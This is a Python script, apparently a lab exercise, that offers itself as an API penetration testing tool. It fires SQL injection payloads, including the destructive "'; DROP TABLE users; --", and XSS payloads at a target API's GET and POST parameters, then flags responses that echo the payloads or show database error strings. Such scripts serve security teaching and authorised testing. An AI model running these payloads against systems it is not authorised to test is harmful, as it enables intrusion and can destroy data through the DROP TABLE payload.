"""
API Penetration Testing Script
==========================================
Author: Your Name
Description: A comprehensive tool to test API endpoints for vulnerabilities such as XSS, SQL Injection, and other injection attacks. Includes authentication support, dynamic endpoint discovery, and detailed reporting. 

Usage:
    python lab2_injection_attacks.py --url <API_BASE_URL> [--auth <AUTH_TOKEN>] [--endpoints <file>] [--report <output_report.json>]

Requirements:
    - Python 3.6+
    - requests library
    - tqdm (optional, for progress bars)

Example:
    python lab2_injection_attacks.py --url https://api.example.com --auth BearerToken123 --endpoints endpoints.txt --report report.json
"""

import requests
import argparse
import json
from tqdm import tqdm

# Payloads for injection attacks
test_payloads = {
    'sql_injection': [
        "' OR '1'='1", '" OR "1"="1', "'; DROP TABLE users; --", "admin'--"
    ],
    'xss': [
        '<script>alert(1)</script>', '<img src=x onerror=alert(2)>', '"<svg/onload=alert(3)>', '\u003cscript\u003ealert(4)\u003c/script\u003e'
    ]
}

# Helper function for reporting
class Report:
    def __init__(self):
        self.results = []

    def log(self, endpoint, method, params, payload_type, response, vulnerable):
        entry = {
            'endpoint': endpoint,
            'method': method,
            'params': params,
            'payload_type': payload_type,
            'status_code': response.status_code,
            'response': response.text[:200],
            'vulnerable': vulnerable
        }
        self.results.append(entry)

    def save(self, filename):
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)

# Dynamic endpoint collection
def load_endpoints(base_url, file_path=None):
    endpoints = []
    if file_path:
        with open(file_path) as f:
            for line in f:
                if line.strip():
                    ep = line.strip()
                    endpoints.append(ep if ep.startswith('/') else '/' + ep)
    else:
        # Add default endpoints for demonstration (extend as needed)
        endpoints = ['/login', '/register', '/user', '/items', '/search', '/profile']
    return endpoints

# Detect possible XSS vulnerabilities
def detect_xss(response):
    return any(x in response.text for x in [
        '<script>alert(1)</script>', '<img src=x onerror=alert(2)>', '"<svg/onload=alert(3)>', '<script>alert(4)</script>'
    ])

# Detect SQL error patterns
def detect_sql_injection(response):
    errors = [
        'SQL syntax', 'mysql_fetch', 'You have an error in your SQL syntax',
        'Warning: mysql_', 'ORA-', 'SQLite', 'psql:', 'unterminated quoted string'
    ]
    return any(e.lower() in response.text.lower() for e in errors)

# Find parameter locations in endpoint definitions
def parse_endpoint_parameters(endpoint):
    params = []
    if '{' in endpoint and '}' in endpoint:
        parts = endpoint.split('/')
        for part in parts:
            if part.startswith('{') and part.endswith('}'):
                params.append(part.strip('{}'))
    return params

# Main penetration test logic
def test_endpoints(base_url, endpoints, auth=None, report_file=None):
    headers = {'Authorization': auth} if auth else {}
    report = Report()
    progress = tqdm(endpoints, desc="Testing endpoints")
    
    for endpoint in progress:
        url = base_url + endpoint
        params = parse_endpoint_parameters(endpoint)
        for method in ['GET', 'POST']:
            for attack_type, payloads in test_payloads.items():
                for payload in payloads:
                    test_params = {}
                    for param in params:
                        test_params[param] = payload
                    try:
                        if method == 'GET':
                            resp = requests.get(url, params=test_params, headers=headers, timeout=5)
                        else:
                            resp = requests.post(url, data=test_params, headers=headers, timeout=5)
                        vuln = False
                        if attack_type == 'xss' and detect_xss(resp):
                            vuln = True
                        if attack_type == 'sql_injection' and detect_sql_injection(resp):
                            vuln = True
                        report.log(endpoint, method, test_params, attack_type, resp, vuln)
                    except Exception as e:
                        report.log(endpoint, method, test_params, attack_type, type('resp', (), {'status_code': 'N/A', 'text': str(e)}), False)
    print(f"\nTesting completed. Detailed report{' written to ' + report_file if report_file else ''}.")
    if report_file:
        report.save(report_file)
    else:
        print(json.dumps(report.results, indent=2))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="API Penetration Testing Tool")
    parser.add_argument('--url', required=True, help="Base URL of the API (e.g., https://api.example.com)")
    parser.add_argument('--auth', help="Authentication token or credentials (will be added to Authorization header)")
    parser.add_argument('--endpoints', help="File path to list of endpoints (one per line). If not provided, a default list is used.")
    parser.add_argument('--report', help="Path to save the report JSON file")
    args = parser.parse_args()

    endpoints = load_endpoints(args.url, args.endpoints)
    test_endpoints(args.url, endpoints, args.auth, args.report)
